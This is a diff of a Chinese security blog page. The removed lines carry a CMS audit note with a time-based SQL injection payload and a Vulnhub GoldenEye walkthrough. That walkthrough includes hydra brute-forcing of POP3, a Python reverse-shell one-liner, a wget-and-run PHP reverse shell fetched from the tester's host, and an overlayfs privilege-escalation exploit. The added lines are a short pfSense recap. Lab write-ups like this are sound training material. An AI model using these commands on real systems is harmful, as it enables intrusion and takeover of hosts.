-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># payload 仅供参考</span></span><br><span class="line"></span><br><span class="line">(select\*from(select sleep(10))x)#</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x03-反序列化"><a href="#0x03-反序列化" class="headerlink" title="0x03 反序列化"></a>0x03 反序列化</h1><p>全局搜索 unserialize，跟进结果，发现可控点被 sqlesc 给过滤了，md 我单双引号怎么说嘛。。。<br>最骚的是全局搜索 class 和 public function 根本没有结果，呵呵哒，一个功能类的没有，我真是醉了。<br>ref：<a href="https://shavchen.github.io/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://shavchen.github.io/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br><a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86452</a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
-<li>这套 cms 审下来，有好很多地方都是形如<strong>0x02 的注入</strong>一样的拼接，但都需要高权限才能访问到漏洞代码处，进而注入，价值不大</li>
-<li>一个 php 的类读没有，参数绝大部分都来强制类型转换，没有常见的命令执行函数</li>
-<li>preg_match 带/e 的模式，可控参数有类型限制，无果</li>
-<li>可以参考这几个老哥的<a href="https://www.cvedetails.com/product/39021/?q=nexusphp" target="_blank" rel="noopener">cve</a>和<a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?relLdKey=2017100498" target="_blank" rel="noopener">cnnvd</a>，17 年的时候刷了一波大规模的洞，主要是 xss 和 sql 注入，个人觉得索然无味</li>
-<li>这次审计也只发现了 nowarn.php 中没有报送的一个参数，不过需要高权限账号，没有多大利用意义就是了</li>
+<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><p>一开始根本没锁定这个 pfSense,还是经验不够了，只注意了 lighttpd</p>
+<ol>
+<li>icon 跟 body 其实都有蛛丝马迹<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766699999-b025290e-5406-4518-88bd-79875e00d0d8.png#align=left&display=inline&height=989&margin=%5Bobject%20Object%5D&name=clue.png&originHeight=989&originWidth=1919&size=331603&status=done&style=none&width=1919" alt="clue.png"></li>
+<li>enumeration！<br>常用扫目录工具有 dirbuster+ dirb + wfuzz</li>
 </ol>
 
           
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2019/12/26/yuque/vulnhub-GoldenEye%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Unc1e">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Unc1e的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/26/yuque/vulnhub-GoldenEye%E7%AC%94%E8%AE%B0/" itemprop="url">vulnhub-GoldenEye笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-26T11:36:16+08:00">
-                2019-12-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 25/tcp open smtp</span></span><br><span class="line"></span><br><span class="line">| fingerprint-strings:</span><br><span class="line">| Hello:</span><br><span class="line">| 220 ubuntu GoldentEye SMTP Electronic-Mail agent</span><br><span class="line">|\_ Syntax: EHLO hostname</span><br><span class="line">|\_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,</span><br><span class="line"></span><br><span class="line"><span class="section"># 80/tcp open http Apache httpd 2.4.7 ((Ubuntu))</span></span><br><span class="line"></span><br><span class="line">| http-methods:</span><br><span class="line">|\_ Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|\_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|\_http-title: GoldenEye Primary Admin Server</span><br><span class="line"></span><br><span class="line"><span class="section"># 55006/tcp open ssl/pop3 Dovecot pop3d</span></span><br><span class="line"></span><br><span class="line">|\_pop3-capabilities: RESP-CODES TOP CAPA AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING UIDL</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Issuer: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">| Not valid after: 2028-04-23T03:23:52</span><br><span class="line">| MD5: d039 2e71 c76a 2cb3 e694 ec40 7228 ec63</span><br><span class="line">|\_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77</span><br><span class="line">|\_ssl-date: TLS randomness does not represent time</span><br><span class="line"></span><br><span class="line"><span class="section"># 55007/tcp open pop3 Dovecot pop3d</span></span><br><span class="line"></span><br><span class="line">|\_pop3-capabilities: RESP-CODES SASL(PLAIN) TOP PIPELINING STLS CAPA AUTH-RESP-CODE USER UIDL</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Issuer: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">| Not valid after: 2028-04-23T03:23:52</span><br><span class="line">| MD5: d039 2e71 c76a 2cb3 e694 ec40 7228 ec63</span><br><span class="line">|\_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77</span><br><span class="line">|\_ssl-date: TLS randomness does not represent time</span><br></pre></td></tr></table></figure>
-
-<p>扫出两个端口，25 端口尝试用 smtp 登录了下，失败</p>
-<h1 id="爆破-web-的-401-认证"><a href="#爆破-web-的-401-认证" class="headerlink" title="爆破 web 的 401 认证"></a>爆破 web 的 401 认证</h1><p>跟随首页提示，发现个 401 认证<br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577332091909-0d56efe2-45f3-4ead-a983-43c30d5dbf3c.png#align=left&display=inline&height=407&name=image.png&originHeight=813&originWidth=1282&size=72189&status=done&style=none&width=641" alt="image.png"></p>
-<p>接着 f12 审查首页的元素，发现某个 js 里有点东西</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577331873021-85db72cd-0376-4123-96c0-d13f17aa5645.png#align=left&display=inline&height=470&name=image-20191224184854033.png&originHeight=470&originWidth=1146&size=75216&status=done&style=none&width=1146" alt="image-20191224184854033.png"></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># html 实体解码结果</span></span><br><span class="line"></span><br><span class="line">Boris:InvincibleHack3r</span><br></pre></td></tr></table></figure>
-
-<p>利用这个凭据，再结合刚刚的那个 401 认证界面，用各个用户名尝试登录，都失败了。。。不应该啊<br>接着我试着采取常用的<a href="https://www.cnblogs.com/xinaixia/p/5852688.html" target="_blank" rel="noopener">绕过 Web 授权和认证之篡改 HTTP 请求</a>手法，用 POST, OPTIONS, HEAD 来尝试绕过 401 认证，也失败了。</p>
-<p>最后实在不行，准备爆破 401 认证了，按如下配置（还好用户名里加了条小写的 boris）<br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577331651331-b28c5534-3dca-4e71-898b-88df543966e6.png#align=left&display=inline&height=421&name=image.png&originHeight=841&originWidth=1175&size=205359&status=done&style=none&width=587.5" alt="image.png"></p>
-<p>顺利得到结果</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577332155829-a707cd9d-2177-422f-9175-9d9724839942.png#align=left&display=inline&height=467&name=image.png&originHeight=934&originWidth=822&size=108946&status=done&style=none&width=411" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577332628819-02f9f05c-a270-401b-8131-f2e10054eee0.png#align=left&display=inline&height=143&name=image.png&originHeight=287&originWidth=540&size=9713&status=done&style=none&width=269" alt="image.png"></p>
-<h1 id="爆破邮件服务器"><a href="#爆破邮件服务器" class="headerlink" title="爆破邮件服务器"></a>爆破邮件服务器</h1><p>顺利进入后台，界面如图<br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577342792459-110ce689-12c8-4a63-b8e3-062090e73119.png#align=left&display=inline&height=438&name=image.png&originHeight=876&originWidth=1738&size=748466&status=done&style=none&width=869" alt="image.png">看到这段描述（源码里看到还提供了俩用户名），就将目标放在邮件服务器 pop3 上</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Qualified GoldenEye Network Operator Supervisors:</span><br><span class="line">Natalya</span><br><span class="line">Boris</span><br></pre></td></tr></table></figure>
-
-<p>用 hydra 尝试爆破，使用的是 kali 自带的 fastrack 字典<br><code>hydra -l boris -P /usr/share/wordlists/fasttrack.txt 192.168.111.5 -s55007 pop3 -V -I</code><br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577342725160-84abf4d9-3516-4901-9b76-8787feb5c0ed.png#align=left&display=inline&height=171&name=image.png&originHeight=342&originWidth=1518&size=307010&status=done&style=none&width=759" alt="image.png"></p>
-<p>爆破结果，得到两组账号，登录 pop3，深入查看邮件信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578992352181-ee562c6a-a891-4757-b8e1-a0397303d326.png#align=left&display=inline&height=67&name=image.png&originHeight=133&originWidth=1047&size=58357&status=done&style=none&width=523.5" alt="image.png"></p>
-<h2 id="POP3-命令"><a href="#POP3-命令" class="headerlink" title="POP3 命令"></a>POP3 命令</h2><p>pop3 的登录，可以用 netcat 来连，在这里记录下 POP3 明文连接的命令<br>默认监听的 TCP 端口为 110</p>
-<table>
-<thead>
-<tr>
-<th>USER [username]</th>
-<th>处理用户名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>PASS [password]</td>
-<td>处理用户密码</td>
-</tr>
-<tr>
-<td>LIST [Msg#]</td>
-<td>处理返回邮件数量和每个邮件的大小，不跟参数会返回邮件的列表</td>
-</tr>
-<tr>
-<td>RETR [Msg#]</td>
-<td>处理返回由参数标识的邮件的全部文本</td>
-</tr>
-<tr>
-<td>DELE [Msg#]</td>
-<td>将参数标识的邮件标记为删除，由 quit 命令执行</td>
-</tr>
-<tr>
-<td>RSET</td>
-<td>重置所有标记为删除的邮件，用于撤消 DELE 命令</td>
-</tr>
-<tr>
-<td>QUIT</td>
-<td>终止会话</td>
-</tr>
-</tbody></table>
-<p>翻找邮件<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578992105987-1b15c3e6-291a-4fcb-a7dd-e6f3e3e72010.png#align=left&display=inline&height=360&name=image.png&originHeight=719&originWidth=1216&size=91116&status=done&style=none&width=608" alt="image.png"></p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line"><span class="code">    username: xenia</span></span><br><span class="line"><span class="code">    password: RCP90rulez!</span></span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">\<span class="emphasis">*\*</span>Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line">Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br></pre></td></tr></table></figure>
-
-<p>邮件让咱们先绑 host，再访问<code>severnaya-station.com</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578992787482-a46918b1-60e7-4095-a733-b524632eaca8.png#align=left&display=inline&height=428&name=image.png&originHeight=856&originWidth=1444&size=188952&status=done&style=none&width=722" alt="image.png"><br>直接访问 ip 失败，绑完 host 能访问了，是个慕课网站；翻到一条信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994260782-dfdb001d-60b0-4a27-8758-b431a4665adb.png#align=left&display=inline&height=275&name=image.png&originHeight=550&originWidth=1907&size=222978&status=done&style=none&width=953.5" alt="image.png">暗示邮箱爆破？好吧，满足你！一样用 hydra 爆破，fastrack 字典，出结果</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994015693-d7aa86a7-6c1f-4c27-97b5-247efddcf4fc.png#align=left&display=inline&height=27&name=image.png&originHeight=54&originWidth=1568&size=29768&status=done&style=none&width=784" alt="image.png"></p>
-<p>一样用 netcat 登录，查看邮件<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994383131-4ed40b9a-6b45-4835-8c3a-c28305b519df.png#align=left&display=inline&height=231&name=image.png&originHeight=463&originWidth=1369&size=92725&status=done&style=none&width=684.5" alt="image.png"><br>又获得一组账号密码<code>dr_doak-4England!</code>，感觉是老师的账号，登进去看看<br>很遗憾，并不是老师的账号，也没有导入问题的地方。。。</p>
-<p>不过随即又找到一些信息，在 private file 里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994667466-8f3ac632-68c1-4c6b-a730-ad8ce19fe7b1.png#align=left&display=inline&height=254&name=image.png&originHeight=507&originWidth=1894&size=121665&status=done&style=none&width=947" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578995362835-2ca727d3-ad77-4f3e-ade7-8452b865640b.png#align=left&display=inline&height=478&name=image.png&originHeight=956&originWidth=1536&size=751445&status=done&style=none&width=768" alt="image.png"><br>根据下载的图片，用打开发现 eof 后面再没有内容了，不过在 exif 里发现了好东西，base64 编码的一串东西</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; file <span class="keyword">for</span>-007.jpg</span></span><br><span class="line">for-007.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300,</span><br><span class="line">segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7,</span><br><span class="line">description=eFdpbnRlcjE5OTV4IQ==, manufacturer=GoldenEye, resolutionunit=2, software=linux], baseline, precision 8, 313x212, components 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; <span class="built_in">echo</span> <span class="string">'eFdpbnRlcjE5OTV4IQ=='</span> |base64 -d</span></span><br><span class="line">xWinter1995x!</span><br></pre></td></tr></table></figure>
-
-<p>解码，慕课网站 admin 的密码到手！</p>
-<h1 id="拿-shell"><a href="#拿-shell" class="headerlink" title="拿 shell"></a>拿 shell</h1><p>利用上传点上传 shell，反弹 msf 的 shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /var/www/html/gnocertdir/</span></span><br><span class="line">/gnocertdir/draftfile.php/5/user/draft/810667993/reverse_php.php</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> /var/www/html/gnocertdir/draftfile.php/5/user/draft/810667993/reverse_php.php</span></span><br></pre></td></tr></table></figure>
-
-<p>命令执行点</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿webshell</span></span><br><span class="line"><span class="comment"># Home / ► Site administration / ► Server / ► System paths</span></span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.111.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home / ► Site administration / ► Plugins / ► Text editors / ► TinyMCE HTML editor#</span></span><br><span class="line">设置pspellshell为spell engine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹初始shell</span></span><br><span class="line">wget http://<span class="number">192.168</span><span class="number">.111</span><span class="number">.3</span>/reverse_php.php</span><br><span class="line">chmod +x reverse_php.php</span><br><span class="line">php -f  reverse_php.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1580292657601-c4393dd1-c966-40de-883e-37cdd03677fe.png#align=left&display=inline&height=407&name=image.png&originHeight=814&originWidth=1156&size=140969&status=done&style=none&width=578" alt="image.png"><br>TinyMCEHTMLeditor<br>Spellengine<br>PSpellshell<br>Default:GoogleSpell<br>editortinymcespellengine<br>Spelllanguagelist<br>+English-en,Danish-da,uhninniDefault<br>editortinymcespelllanguagelist<br>+Englishen,Danishda,Duhih</p>
-<pre><code>![image.png](https://cdn.nlark.com/yuque/0/2020/png/166008/1580291233722-138acd03-34cf-4bc3-81a0-86fefe890992.png)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overlayfs提权</span></span><br><span class="line"><span class="comment">#	ref:https://www.exploit-db.com/download/37292.c</span></span><br><span class="line"></span><br><span class="line">sed -i <span class="string">'s/gcc/cc/g'</span> overlay.c <span class="comment"># 系统内没有gcc,所以只能用cc代替</span></span><br><span class="line"><span class="comment">#	sed跟选项-i，会匹配文件中每一行的第一个gcc替换为cc</span></span><br><span class="line"><span class="comment">#	后缀 /g 标记会替换每一行中的所有匹配：</span></span><br><span class="line">cc overlay.c -o overlay</span><br><span class="line">提权成功</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1580292490126-49a36680-950f-458e-b81d-b8a3f635fe6e.png#align=left&display=inline&height=338&name=image.png&originHeight=676&originWidth=914&size=97075&status=done&style=none&width=457" alt="image.png"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2019/04/01/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Unc1e">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Unc1e的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/01/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T09:50:42+08:00">
-                2019-04-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/01/hello-world/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
@@ -813,7 +373,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+    <a class="extend prev" rel="prev" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/5/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
   </nav>
 
 
